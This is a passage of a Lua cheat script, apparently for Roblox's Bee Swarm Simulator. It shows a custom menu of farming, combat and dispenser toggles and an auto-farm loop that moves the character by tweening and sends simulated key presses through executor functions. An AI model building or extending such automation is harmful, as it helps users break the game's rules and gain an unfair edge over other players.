                if self.killViciousBee then
                    if not self.autoFarmEnabled then

                    end
                else

                end
            elseif toggle.key == "killCommandoChick" then
                self.killCommandoChick = not self.killCommandoChick
                self.needsRedraw = true
                if self.killCommandoChick then
                    if not self.autoFarmEnabled then

                    end
               else

               end
            elseif toggle.key == "killTunnelBear" then
    self.killTunnelBear = not self.killTunnelBear
    self.needsRedraw = true
    
    if self.killTunnelBear then
        if not self.autoFarmEnabled then

        end
    else

    end
            elseif toggle.key == "killWindy" then
                self.killWindy = not self.killWindy
                self.needsRedraw = true
    
                if self.killWindy then
                    if not self.autoFarmEnabled then

                    end
                else

                end
            else
                self[toggle.key] = not self[toggle.key]
                self.needsRedraw = true
            end
        end)
    end
    
    local dropdownX = contentX + 220
    local dropdownY = contentY
    
    self:CreateText("Target Selection", dropdownX, contentY - 25, Color3.fromRGB(200, 210, 220), 14)
    
    self:CreateText("Last selected: " .. (self.selectedCombatTarget or "Any Mob"), dropdownX, dropdownY - 12, Color3.fromRGB(120, 130, 145), 10)
    
    self:CreateRect(dropdownX, dropdownY, 150, 26, Color3.fromRGB(30, 35, 45))
    self:CreateText(self.selectedCombatTarget or "Any Mob", dropdownX + 8, dropdownY + 7, Color3.fromRGB(200, 210, 220), 12)
    self:CreateText("v", dropdownX + 135, dropdownY + 6, Color3.fromRGB(150, 160, 175), 12)
    
    self:RegisterButton(dropdownX, dropdownY, 150, 26, function()
        if not self.lastMousePressed then
            self.combatDropdownOpen = not self.combatDropdownOpen
            self.needsRedraw = true
        end
    end)
    
    if self.combatDropdownOpen then
        local options = {
            "Any Mob",
            "Ladybugs",
            "Rhino Beetles",
            "Mantis",
            "Scorpions",
            "Werewolf",
            "Cave Monsters",
            "King Beetle",
            "Tunnel Bear"
        }
        
        local menuY = dropdownY + 28
        
        self:CreateRect(dropdownX, menuY, 150, #options * 24, Color3.fromRGB(25, 28, 35))
        
        for i, option in ipairs(options) do
            local optionY = menuY + ((i - 1) * 24)
            
            self:CreateRect(dropdownX, optionY, 150, 24, Color3.fromRGB(40, 45, 55))
            self:CreateText(option, dropdownX + 8, optionY + 6, Color3.fromRGB(200, 210, 220), 11)
            
            self:RegisterButton(dropdownX, optionY, 150, 24, function()
                if not self.lastMousePressed then
                    self.selectedCombatTarget = option
                    self.combatDropdownOpen = false
                    self.needsRedraw = true
                end
            end)
        end
    end
end

function UI:RenderMiscTab()
    local contentX = self.panel.sidebarWidth + 30
    local contentY = 80

    self:CreateText("Miscellaneous", contentX, contentY, Color3.fromRGB(255, 255, 255), 20)

    contentY = contentY + 40

    self:CreateText("Dispensers", contentX, contentY, Color3.fromRGB(200, 210, 220), 16)

    local dispensersY = contentY + 30

    -- DISPENSER TOGGLES
    local dispensers = {
        -- First button: Auto Align
        {label = "Auto Align", key = "autoAlign"},
        -- ...existing dispenser buttons...
        {label = "Coconut Dispenser", key = "collectCoconutDispenser"},
        {label = "Ant Pass", key = "collectAntPass"},
        {label = "Glue Dispenser", key = "collectGlue"},
        {label = "Honey Dispenser", key = "collectHoneyDispenser"},
        {label = "Blueberry Dispenser", key = "collectBlueberryDispenser"},
        {label = "Treat Dispenser", key = "collectTreatDispenser"},
        {label = "Strawberry Dispenser", key = "collectStrawberryDispenser"},
        {label = "Royal Jelly Dispenser", key = "collectRoyalJellyDispenser"},
        {label = "Robo Pass Dispenser", key = "collectRoboPassDispenser"}
    }

    for i, dispenser in ipairs(dispensers) do
        local toggleY = dispensersY + ((i - 1) * 28)
        local value
        if dispenser.key == "autoAlign" then
            value = autoAlignEnabled
        else
            value = self[dispenser.key] or false
        end

        self:CreateRect(contentX, toggleY, 196, 22, Color3.fromRGB(30, 35, 45))
        self:CreateText(dispenser.label, contentX + 8, toggleY + 6, Color3.fromRGB(200, 210, 220), 12)
        local switchX = contentX + 170
        local switchColor = value and Color3.fromRGB(16, 185, 129) or Color3.fromRGB(60, 70, 85)
        self:CreateRect(switchX, toggleY + 6, 20, 10, switchColor)
        local circleX = value and switchX + 12 or switchX + 1
        self:CreateRect(circleX, toggleY + 7, 7, 7, Color3.fromRGB(255, 255, 255))

        self:RegisterButton(contentX, toggleY, 196, 22, function()
            if dispenser.key == "autoAlign" then
                autoAlignEnabled = not autoAlignEnabled

                self.needsRedraw = true
            else
                self[dispenser.key] = not self[dispenser.key]
                self.needsRedraw = true

            end
        end)
    end

    -- RIGHT COLUMN: Automations
    local automationsX = contentX + 220
    self:CreateText("Automations", automationsX, contentY, Color3.fromRGB(200, 210, 220), 16)

    local automationsY = contentY + 30

    local automations = {
        {label = "Summon Honey Storm", key = "summonHoneyStorm"},
        {label = "Collect Wealth Clock (Bug)", key = "collectWealthClock"},
        {label = "Auto Planters", key = "autoPlanters"},
        {label = "Auto Boost", key = "autoBoost"},
        {label = "Auto Quest", key = "autoQuest"},
        {label = "Auto Memory Match", key = "autoMemoryMatch"},
        {label = "Auto Beesmas", key = "autoBeesmas"},
        {label = "Auto Honeyday", key = "autoHoneyday"}
    }

    for i, automation in ipairs(automations) do
        local toggleY = automationsY + ((i - 1) * 28)

        local value = self[automation.key] or false

        -- Toggle background
        self:CreateRect(automationsX, toggleY, 196, 22, Color3.fromRGB(30, 35, 45))

        -- Label
        self:CreateText(automation.label, automationsX + 8, toggleY + 6, Color3.fromRGB(200, 210, 220), 12)

        -- Toggle switch
        local switchX = automationsX + 170
        local switchColor = value and Color3.fromRGB(16, 185, 129) or Color3.fromRGB(60, 70, 85)
        self:CreateRect(switchX, toggleY + 6, 20, 10, switchColor)

        -- Toggle circle
        local circleX = value and switchX + 12 or switchX + 1
        self:CreateRect(circleX, toggleY + 7, 7, 7, Color3.fromRGB(255, 255, 255))

        -- Register button click
        self:RegisterButton(automationsX, toggleY, 196, 22, function()
            self[automation.key] = not self[automation.key]
            self.needsRedraw = true

        end)
    end
end

function UI:RenderSettingsTab()
    local contentX = self.panel.sidebarWidth + 30
    local contentY = 80
    
    self:CreateText("Settings", contentX, contentY, Color3.fromRGB(255, 255, 255), 20)
    
    contentY = contentY + 40
    
    -- Settings toggles
    local settingsToggles = {
        {label = "Hi", value = true},
        {label = "Hi", value = false},
        {label = "Hi", value = true},
        {label = "Hi", value = false},
        {label = "Hi", value = true},
        {label = "Hi", value = false},
        {label = "Hi", value = true},
        {label = "Hi", value = false}
    }
    
    for i, toggle in ipairs(settingsToggles) do
        local toggleY = contentY + ((i - 1) * 28)
        
        -- Toggle background
        self:CreateRect(contentX, toggleY, 196, 22, Color3.fromRGB(30, 35, 45))
        
        -- Label
        self:CreateText(toggle.label, contentX + 8, toggleY + 6, Color3.fromRGB(200, 210, 220), 12)
        
        -- Toggle switch
        local switchX = contentX + 170
        local switchColor = toggle.value and Color3.fromRGB(16, 185, 129) or Color3.fromRGB(60, 70, 85)
        self:CreateRect(switchX, toggleY + 6, 20, 10, switchColor)
        
        -- Toggle circle
        local circleX = toggle.value and switchX + 12 or switchX + 1
        self:CreateRect(circleX, toggleY + 7, 7, 7, Color3.fromRGB(255, 255, 255))
        
        self:RegisterButton(contentX, toggleY, 196, 22, function()

        end)
    end
    
    -- Tween Speed Slider on the right
    local sliderX = contentX + 220
    local sliderY = contentY
    
    self:CreateText("Tween Speed", sliderX, sliderY - 25, Color3.fromRGB(200, 210, 220), 14)
    
    -- Display current speed value
    self:CreateText("Speed: " .. tostring(self.tweenSpeed), sliderX, sliderY - 12, Color3.fromRGB(120, 130, 145), 10)
    
    -- Slider background
    local sliderWidth = 150
    self:CreateRect(sliderX, sliderY + 8, sliderWidth, 6, Color3.fromRGB(40, 45, 55))
    
    -- Calculate slider position (map 20-120 to 0-150)
    local normalizedValue = (self.tweenSpeed - 20) / (120 - 20)
    local sliderPos = normalizedValue * sliderWidth
    
    -- Slider fill
    self:CreateRect(sliderX, sliderY + 8, sliderPos, 6, Color3.fromRGB(16, 185, 129))
    
    -- Slider handle
    self:CreateRect(sliderX + sliderPos - 4, sliderY + 2, 8, 18, Color3.fromRGB(16, 185, 129))
    
    self:RegisterButton(sliderX, sliderY + 2, sliderWidth, 18, function()
        self.draggingSlider = true
    end)

    -- Min/Max labels
    self:CreateText("20", sliderX, sliderY + 20, Color3.fromRGB(120, 130, 145), 10)
    self:CreateText("120", sliderX + sliderWidth - 15, sliderY + 20, Color3.fromRGB(120, 130, 145), 10)
    
-- Gather Time Slider
    local gatherSliderY = sliderY + 60
    
    self:CreateText("Gather Time (Minutes)", sliderX, gatherSliderY - 25, Color3.fromRGB(200, 210, 220), 14)
    self:CreateText("Time: " .. tostring(self.gatherTime) .. " min", sliderX, gatherSliderY - 12, Color3.fromRGB(120, 130, 145), 10)
    
    -- Slider background
    self:CreateRect(sliderX, gatherSliderY + 8, sliderWidth, 6, Color3.fromRGB(40, 45, 55))
    
    -- Calculate slider position (map 1-30 to 0-150)
    local gatherNormalizedValue = (self.gatherTime - 1) / (30 - 1)
    local gatherSliderPos = gatherNormalizedValue * sliderWidth
    
    -- Slider fill
    self:CreateRect(sliderX, gatherSliderY + 8, gatherSliderPos, 6, Color3.fromRGB(16, 185, 129))
    
    -- Slider handle
    self:CreateRect(sliderX + gatherSliderPos - 4, gatherSliderY + 2, 8, 18, Color3.fromRGB(16, 185, 129))
    
    self:RegisterButton(sliderX, gatherSliderY + 2, sliderWidth, 18, function()
        self.draggingGatherSlider = true
    end)
    
    -- Min/Max labels
    self:CreateText("1", sliderX, gatherSliderY + 20, Color3.fromRGB(120, 130, 145), 10)
    self:CreateText("30", sliderX + sliderWidth - 15, gatherSliderY + 20, Color3.fromRGB(120, 130, 145), 10)

    -- Version info at bottom
    local versionY = contentY + 240
    self:CreateText("Version 1.1.5 - Fixed Farm Bloom", sliderX, versionY, Color3.fromRGB(100, 110, 125), 11)
    self:CreateText("Lito", sliderX, versionY + 18, Color3.fromRGB(100, 110, 125), 11)
end




function UI:StartAutoFarm()
    if self.selectedOption == "Select Field..." or self.selectedOption == "" then

        self.autoFarmEnabled = false
        self.needsRedraw = true
        return
    end
    
    if not self.originalAutoFarmField or self.lastFieldChangeSource == "autofarm" then
        self.originalAutoFarmField = self.selectedOption
        self.lastFieldChangeSource = "autofarm"
    end

    -- Check if coconut crab is running
    if self.killCoconutCrab then

        self.autoFarmEnabled = false
        self.needsRedraw = true
        return
    end

    if self.autoFarmRunning then

        self:StopAutoFarm()
        wait(1)
    end
    
    if self.autoFarmThread then

        task.cancel(self.autoFarmThread)
        self.autoFarmThread = nil
        wait(0.5)
    end
    
    self.autoFarmRunning = true
    self.status = "Auto Farm Active"
    self.needsRedraw = true
    self:StartTimedActionsHandler()
    self.gatherStartTime = os.clock()
    self.returningFromConversion = false
    
    self.autoFarmThread = spawn(function()        
        local lastSelectedField = self.selectedOption
        local fullPollenTime = nil
        local returningToHive = false
        local huntingWindy = false
        local originalFieldBeforeWindy = nil
        local walkedToWindyOnce = false
        local hasReachedFieldOnce = false
        
        -- Helper function to check for death and handle respawn
        local function checkAndHandleDeath()
            local player = game.Players.LocalPlayer
            local character = player.Character
            
            if not character then
                return true -- Treat no character as "wait for respawn"
            end
            
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health <= 0 then

                self.status = "Respawning..."
                self.needsRedraw = true
                
                -- Stop everything
                StopWalking()
                self:ClearTweenQueue()
                
                -- Wait for respawn
                local respawned = WaitForRespawn(30)
                
                if respawned then

                    
                    self.status = "Waiting for bees..."
                    self.needsRedraw = true
                    wait(15)
                    -- If was hunting Vicious Bee, return to original field
                    -- Don't reset Vicious hunting on death - keep hunting until it despawns
if self.huntingVicious then

    walkedToViciousOnce = false  -- Reset so we walk to it again after respawn
end
                    
                    -- Reset states (INCLUDING SPRINKLERS)
                    returningToHive = false
                    fullPollenTime = nil
                    self.sprinklersPlaced = false  -- CRITICAL: Reset sprinkler flag so they get placed again
                    self.status = "Auto Farm Active"
                    self.needsRedraw = true
                    
                    wait(3)
                    
                    -- Force tween back to selected field
                    player = game.Players.LocalPlayer
                    character = player.Character
                    if character then
                        local hrp = character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local flowerZones = game.Workspace.FlowerZones
                            if flowerZones and self.selectedOption then
                                local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                                if targetZone then

                                    local targetPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                                    self:QueueTween(hrp, targetPos, true)
                                    
                                    while self.processingTween and self.autoFarmEnabled do
                                        wait(0.1)
                                    end
                                    
                                    wait(1)


                                end
                            end
                        end
                    end
                else

                    self:StopAutoFarm()
                    return false
                end
                
                return true -- Death was handled
            end
            
            return false -- No death detected
        end
        
        while self.autoFarmEnabled and self.autoFarmRunning do
            -- Check for death at start of loop
            if checkAndHandleDeath() then
                wait(0.5)
                continue
            end
            
            -- Pause if timed action is running
            if self.pausedForTimedAction then
                wait(0.5)
                continue
            end
            
            local success, err = pcall(function()
                local player = game.Players.LocalPlayer
                local character = player.Character
                
                if not character then

                    wait(1)
                    return
                end
                
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if not hrp then

                    wait(1)
                    return
                end
                
                local coreStats = player:FindFirstChild("CoreStats")
                local gatherTimeSeconds = self.gatherTime * 60
                local timeElapsed = os.clock() - (self.gatherStartTime or os.clock())
                local gatherTimeFull = timeElapsed >= gatherTimeSeconds
                if not self.lastTimerDebug or os.clock() - self.lastTimerDebug >= 10 then
                    self.lastTimerDebug = os.clock()
                end
                if coreStats then
                    local pollen = coreStats:FindFirstChild("Pollen")
                    local capacity = coreStats:FindFirstChild("Capacity")
                    if pollen and capacity then
                        local pollenValue = pollen.Value
                        local capacityValue = capacity.Value 
                        if pollenValue >= capacityValue or gatherTimeFull then
                            if not fullPollenTime then
                                fullPollenTime = os.clock() - 2

                            else
                                local elapsed = os.clock() - fullPollenTime
                            end
                            
                            if fullPollenTime and os.clock() - fullPollenTime >= 2 and not returningToHive then
                                returningToHive = true
                                self.returningFromConversion = true
                                
                                if self.resetWhenFull then
                                    self.status = "Resetting (Full)"
                                    self.needsRedraw = true
                                    
                                    StopWalking()
                                    self:ClearTweenQueue()
                                    ResetPlayer()                                    
                                    local respawned = WaitForRespawn(30)
                                    
                                    if respawned then
                                        self.status = "Waiting for bees..."
                                        self.needsRedraw = true
                                        wait(15)
                                        returningToHive = false
                                        fullPollenTime = nil
                                        self.sprinklersPlaced = false
                                        self.status = "Auto Farm Active"
                                        self.needsRedraw = true
                                        
                                        local player = game.Players.LocalPlayer
                                        local character = player.Character
                                        if character then
                                            local hrp = character:FindFirstChild("HumanoidRootPart")
                                            if hrp then
                                                local flowerZones = game.Workspace.FlowerZones
                                                if flowerZones and self.selectedOption then
                                                    local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                                                    if targetZone then
                                                        local targetPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                                                        self:QueueTween(hrp, targetPos, true)
                                                        wait(1)
                                                    end
                                                end
                                            end
                                        end
                                    else

                                        self:StopAutoFarm()
                                        return
                                    end
                                else
self.status = "Going to Hive"
self.needsRedraw = true

StopWalking()

self:ClearTweenQueue()
wait(0.5)

-- STEP 1: Tween to waypoint first
local waypointPos = Vector3.new(-114, 5, 271)

self:QueueTween(hrp, waypointPos, true)

local maxWaitTime = 60
local startWait = os.clock()

while self.processingTween and self.autoFarmEnabled do
    if checkAndHandleDeath() then
        break
    end
    
    if os.clock() - startWait > maxWaitTime then

        self:ClearTweenQueue()
        break
    end
    wait(0.1)
end


wait(0.5)

-- STEP 2: Find hive and walk to it
local hivePlatforms = game.Workspace:FindFirstChild("HivePlatforms")

if hivePlatforms then
    local playerHive = nil
    
    for _, platform in pairs(hivePlatforms:GetChildren()) do
        local playerRef = platform:FindFirstChild("PlayerRef")
        if playerRef and playerRef.Value then
            local refPlayer = playerRef.Value
            
            if refPlayer.Name == player.Name then
                playerHive = platform
                break
            end
        end
    end
    
    if playerHive then
        local hivePart = playerHive:FindFirstChild("Platform") or playerHive:FindFirstChildWhichIsA("BasePart")
        
        if hivePart then
            local hivePos = Vector3.new(hivePart.Position.X, hivePart.Position.Y + 5, hivePart.Position.Z)
            
            -- WALK to hive (not tween)

            WalkTo(hivePos)
            
            local walkStartTime = os.clock()
            while IsWalking() and self.autoFarmEnabled do
                if os.clock() - walkStartTime > 30 then

                    StopWalking()
                    break
                end
                
                hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local currentPos = hrp.Position
                    local dx = hivePos.X - currentPos.X
                    local dy = hivePos.Y - currentPos.Y
                    local dz = hivePos.Z - currentPos.Z
                    local distanceToHive = math.sqrt(dx * dx + dy * dy + dz * dz)
                    
                    if distanceToHive < 3 then

                        StopWalking()
                        break
                    end
                end
                
                wait(0.1)
            end
            
            StopWalking()
            wait(2)
            
            while not isrbxactive() and self.autoFarmEnabled do
                warn("Roblox Is Not Active")
                self.status = "Waiting for Roblox window"
                self.needsRedraw = true
                wait(0.5)
            end
            
            if self.autoFarmEnabled then
                -- CRITICAL: Verify player is actually at hive before converting
                hrp = character:FindFirstChild("HumanoidRootPart")
                if not hrp then

                    returningToHive = false
                    fullPollenTime = nil
                else
                    local currentPos = hrp.Position
                    local dx = hivePos.X - currentPos.X
                    local dy = hivePos.Y - currentPos.Y
                    local dz = hivePos.Z - currentPos.Z
                    local distanceToHive = math.sqrt(dx * dx + dy * dy + dz * dz)
                    

                    
                    -- If player is NOT at hive (more than 25 studs away), try to return
                    if distanceToHive > 25 then

                        
                        self.status = "Returning to Hive"
                        self.needsRedraw = true
                        
                        -- Try walking back first (5 second attempt)

                        WalkTo(hivePos)
                        
                        local walkStartTime = os.clock()
                        local walkSuccess = false
                        
                        while IsWalking() and self.autoFarmEnabled do
                            if os.clock() - walkStartTime > 5 then

                                StopWalking()
                                break
                            end
                            
                            hrp = character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                local cPos = hrp.Position
                                local cdx = hivePos.X - cPos.X
                                local cdy = hivePos.Y - cPos.Y
                                local cdz = hivePos.Z - cPos.Z
                                local cDist = math.sqrt(cdx * cdx + cdy * cdy + cdz * cdz)
                                
                                if cDist < 25 then

                                    StopWalking()
                                    walkSuccess = true
                                    break
                                end
                            end
                            
                            wait(0.1)
                        end
                        
                        StopWalking()
                        
                        -- If walk failed, use tween
                        if not walkSuccess then

                            self:QueueTween(hrp, hivePos, true)
                            
                            local tweenStartTime = os.clock()
                            while self.processingTween and self.autoFarmEnabled do
                                if os.clock() - tweenStartTime > 60 then

                                    self:ClearTweenQueue()
                                    returningToHive = false
                                    fullPollenTime = nil
                                    break
                                end
                                wait(0.1)
                            end
                            
                            if self.processingTween then
                                wait(1)

                            end
                        end
                        
                        wait(0.5)
                    end
                    
                    -- Final distance check before converting
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        currentPos = hrp.Position
                        dx = hivePos.X - currentPos.X
                        dy = hivePos.Y - currentPos.Y
                        dz = hivePos.Z - currentPos.Z
                        distanceToHive = math.sqrt(dx * dx + dy * dy + dz * dz)
                        
                        if distanceToHive > 25 then


                            returningToHive = false
                            fullPollenTime = nil
                        else

                            self.status = "Converting Pollen"
                            self.needsRedraw = true
                            wait(0.3)
                            
                            keypress(0x45)
                            wait(0.1)
                            keyrelease(0x45)
                        end
                    end
                end
                
                -- Check for nearby hive balloon if Convert Balloon is enabled


                local balloonFound = false
                if self.convertBalloon then

                    local balloons = game.Workspace:FindFirstChild("Balloons")

                    
                    if balloons then
                        local hiveBalloons = balloons:FindFirstChild("HiveBalloons")

                        
                        if hiveBalloons then

                            
                            for _, balloonInstance in pairs(hiveBalloons:GetChildren()) do

                                
                                if balloonInstance.Name == "HiveBalloonInstance" then
                                    local balloonBody = balloonInstance:FindFirstChild("BalloonBody")

                                    
                                    if balloonBody and balloonBody:IsA("BasePart") then
                                        local balloonPos = balloonBody.Position
                                        local hrpPos = hrp.Position
                                        
                                        local dx = balloonPos.X - hrpPos.X
                                        local dy = balloonPos.Y - hrpPos.Y
                                        local dz = balloonPos.Z - hrpPos.Z
                                        local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
                                        

                                        
                                        if distance <= 25 then

                                            balloonFound = true
                                            self.status = "Converting Balloon"
                                            self.needsRedraw = true
                                            
                                            while self.autoFarmEnabled and balloonBody and balloonBody.Parent do
                                                -- CRITICAL: Check if player is still at hive during balloon conversion
                                                hrp = character:FindFirstChild("HumanoidRootPart")
                                                if hrp then
                                                    local cPos = hrp.Position
                                                    local cdx = hivePos.X - cPos.X
                                                    local cdy = hivePos.Y - cPos.Y
                                                    local cdz = hivePos.Z - cPos.Z
                                                    local cDist = math.sqrt(cdx * cdx + cdy * cdy + cdz * cdz)
                                                    
                                                    if cDist > 25 then


                                                        
                                                        WalkTo(hivePos)
                                                        local walkStart = os.clock()
                                                        
                                                        while IsWalking() and self.autoFarmEnabled do
                                                            if os.clock() - walkStart > 5 then
                                                                StopWalking()

                                                                self:QueueTween(hrp, hivePos, true)
                                                                
                                                                while self.processingTween and self.autoFarmEnabled do
                                                                    wait(0.1)
                                                                end
                                                                break
                                                            end
                                                            
                                                            hrp = character:FindFirstChild("HumanoidRootPart")
                                                            if hrp then
                                                                local rPos = hrp.Position
                                                                local rdx = hivePos.X - rPos.X
                                                                local rdy = hivePos.Y - rPos.Y
                                                                local rdz = hivePos.Z - rPos.Z
                                                                local rDist = math.sqrt(rdx * rdx + rdy * rdy + rdz * rdz)
                                                                
                                                                if rDist < 5 then
                                                                    StopWalking()
                                                                    wait(1)
                                                                    break
                                                                end
                                                            end
                                                            
                                                            wait(0.1)
                                                        end
                                                        
                                                        StopWalking()
                                                        wait(1)

                                                        
                                                        -- Wait for Roblox to be active before pressing E
                                                        while not isrbxactive() and self.autoFarmEnabled do
                                                            warn("Roblox Is Not Active - waiting to press E")
                                                            self.status = "Waiting for Roblox window"
                                                            self.needsRedraw = true
                                                            wait(0.5)
                                                        end
                                                        
                                                        if self.autoFarmEnabled then

                                                            keypress(0x45)
                                                            wait(0.2)
                                                            keyrelease(0x45)
                                                            wait(0.5)

                                                        end
                                                    end
                                                end
                                                

                                                wait(0.5)
                                            end
                                            

                                            break
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                                                    while self.autoFarmEnabled do
                                                -- CRITICAL: Check if player is still at hive during conversion
                                                hrp = character:FindFirstChild("HumanoidRootPart")
                                                if hrp then
                                                    local cPos = hrp.Position
                                                    local cdx = hivePos.X - cPos.X
                                                    local cdy = hivePos.Y - cPos.Y
                                                    local cdz = hivePos.Z - cPos.Z
                                                    local cDist = math.sqrt(cdx * cdx + cdy * cdy + cdz * cdz)
                                                    
                                                    if cDist > 25 then


                                                        
                                                        WalkTo(hivePos)
                                                        local walkStart = os.clock()
                                                        
                                                        while IsWalking() and self.autoFarmEnabled do
                                                            if os.clock() - walkStart > 5 then
                                                                StopWalking()

                                                                self:QueueTween(hrp, hivePos, true)
                                                                
                                                                while self.processingTween and self.autoFarmEnabled do
                                                                    wait(0.1)
                                                                end
                                                                break
                                                            end
                                                            
                                                            hrp = character:FindFirstChild("HumanoidRootPart")
                                                            if hrp then
                                                                local rPos = hrp.Position
                                                                local rdx = hivePos.X - rPos.X
                                                                local rdy = hivePos.Y - rPos.Y
                                                                local rdz = hivePos.Z - rPos.Z
                                                                local rDist = math.sqrt(rdx * rdx + rdy * rdy + rdz * rdz)
                                                                
                                                                if rDist < 5 then
                                                                    StopWalking()
                                                                    wait(1)
                                                                    break
                                                                end
                                                            end
                                                            
                                                            wait(0.1)
                                                        end
                                                        
                                                        StopWalking()

                                                        
                                                        -- Wait for Roblox to be active before pressing E
                                                        while not isrbxactive() and self.autoFarmEnabled do
                                                            warn("Roblox Is Not Active - waiting to press E")
                                                            self.status = "Waiting for Roblox window"
                                                            self.needsRedraw = true
                                                            wait(0.5)
                                                        end
                                                        
                                                        if self.autoFarmEnabled then

                                                            keypress(0x45)
                                                            wait(0.2)
                                                            keyrelease(0x45)
                                                            wait(0.5)

                                                        end
                                                    end
                                                end
                                                
                                                local currentPollen = pollen.Value
                                                
                                                if currentPollen <= 0 then

                                                    wait(4)
                                                    if self.returningFromConversion then

                                                        self.gatherStartTime = os.clock()

                                                        self.returningFromConversion = false
                                                    end
                                                    break
                                                end
                                                
                                                wait(0.5)
                                            end
                                                                                    
                                                    returningToHive = false
                                                    fullPollenTime = nil
                                                    self.status = "Auto Farm Active"
                                                    self.needsRedraw = true
                                                end
                                            else
                                                wait(0.1)
                                            end
                                        else
                                            returningToHive = false
                                            fullPollenTime = nil
                                        end
                                    else
                                        returningToHive = false
                                        fullPollenTime = nil
                                    end
                                end
                            end
                        else
                            -- Not full
                            if fullPollenTime then
                                fullPollenTime = nil
                            end
                            if returningToHive then
                                returningToHive = false
                            end
                        end
                    end
                end
                
                -- Skip field logic if returning to hive
                if returningToHive then
                    wait(1)
                    return
                end
                
                -- Check for Windy Bee
if self.killWindy then

    local windyBeeData = self:CheckForWindyBee()
    
    if windyBeeData then
        local windyBeeField = windyBeeData.field
        local windyBeePos = windyBeeData.position
        
        -- Windy Bee is present
        if not huntingWindy then
            -- Just started hunting

            originalFieldBeforeWindy = self.selectedOption
            if self.lastFieldChangeSource == "autofarm" or not self.lastFieldChangeSource then
                self.originalAutoFarmField = self.selectedOption
            end
            self.selectedOption = windyBeeField.Name
            self.sprinklersPlaced = false
            huntingWindy = true
            walkedToWindyOnce = false
            self.status = "Going to Windy Bee Field"
            self.needsRedraw = true
            lastSelectedField = windyBeeField.Name
            
            -- STEP 1: Tween to the field center first
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones then
                local targetZone = flowerZones:FindFirstChild(windyBeeField.Name)
                if targetZone then
                    local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)

                    self:QueueTween(hrp, fieldCenterPos, true)
                    
                    -- Wait for tween to complete
                    while self.processingTween and self.autoFarmEnabled do
                        if checkAndHandleDeath() then
                            break
                        end
                        wait(0.1)
                    end
                    

                    wait(0.5)
                end
            end
            
            -- STEP 2: Tween to Windy Bee position ONCE (with live position updates)
            if self.autoFarmEnabled and not walkedToWindyOnce then
                self.status = "Tweening to Windy Bee"
                self.needsRedraw = true

                
                -- Start the tween to initial position
                windyBeeData = self:CheckForWindyBee()
                if windyBeeData then
                    windyBeePos = windyBeeData.position
                    self:QueueTween(hrp, windyBeePos, true)
                end
                
                -- Update position every 0.5 seconds during tween
                local lastUpdateTime = os.clock()
                
                while self.processingTween and self.autoFarmEnabled do
                    if checkAndHandleDeath() then
                        break
                    end
                    
                    -- Update Windy Bee position every 0.5 seconds
                    if os.clock() - lastUpdateTime >= 0.5 then
                        windyBeeData = self:CheckForWindyBee()
                        if windyBeeData then
                            windyBeePos = windyBeeData.position
                            
                            -- Cancel current tween and start new one to updated position
                            if self.currentTween then
                                self.currentTween:Stop()
                            end
                            
                            hrp = character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                local startPos = hrp.Position
                                local dx = windyBeePos.X - startPos.X
                                local dy = windyBeePos.Y - startPos.Y
                                local dz = windyBeePos.Z - startPos.Z
                                local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
                                local tweenTime = distance / self.tweenSpeed
                                local tweenInfo = TweenInfo.new(tweenTime, "Linear", "None")
                                self.currentTween = TweenService:Create(hrp, tweenInfo, {Position = windyBeePos})
                                self.currentTween:Play()
                                

                            end
                        end
                        lastUpdateTime = os.clock()
                    end
                    
                    wait(0.1)
                end
                
                walkedToWindyOnce = true

                self.status = "Hunting Windy Bee"
                self.needsRedraw = true
                wait(0.5)
            end
            
        elseif windyBeeField.Name ~= self.selectedOption then
            -- Windy Bee moved to a different field

            self.selectedOption = windyBeeField.Name
            self.sprinklersPlaced = false
            walkedToWindyOnce = true  -- Don't walk to Windy again, just go to new field
            lastSelectedField = windyBeeField.Name
            
            -- Tween to new field center (don't walk to Windy position again)
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones then
                local targetZone = flowerZones:FindFirstChild(windyBeeField.Name)
                if targetZone then
                    local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)

                    self.status = "Following to New Field"
                    self.needsRedraw = true
                    self:QueueTween(hrp, fieldCenterPos, true)
                    
                    -- Wait for tween to complete
                    while self.processingTween and self.autoFarmEnabled do
                        if checkAndHandleDeath() then
                            break
                        end
                        wait(0.1)
                    end
                    

                end
            end
        end
    end
else
    if huntingWindy then
        local returnField = self.originalAutoFarmField or originalFieldBeforeWindy

        self.selectedOption = returnField
        self.lastFieldChangeSource = "autofarm"
        self.sprinklersPlaced = false
        huntingWindy = false
        walkedToWindyOnce = false
        originalFieldBeforeWindy = nil
        self.status = "Returning to Original Field"
        self.needsRedraw = true
        lastSelectedField = returnField              
        StopWalking()
        self:ClearTweenQueue()
        wait(0.5)
                        
        local flowerZones = game.Workspace.FlowerZones
        if flowerZones then
            local targetZone = flowerZones:FindFirstChild(returnField)
            if targetZone then
                character = player.Character
                if character then
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local targetPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)

                        self:QueueTween(hrp, targetPos, true)
                                        
                        local startWait = os.clock()
                        while self.processingTween and self.autoFarmEnabled do
                            if os.clock() - startWait > 60 then

                                self:ClearTweenQueue()
                                break
                            end
                            wait(0.1)
                        end
                                        

                        self.status = "Auto Farm Active"
                        self.needsRedraw = true
                    end
                end
            end
        end
    end
end

-- Check for Sprouts

if self.farmSprouts then
    local sproutData = self:CheckForSprouts()
    
    if sproutData then
        local sproutField = sproutData.field

        
        -- Check if we're already farming this specific sprout field
        if not self.currentSproutField then
            -- Not farming any sprout yet, start farming this one

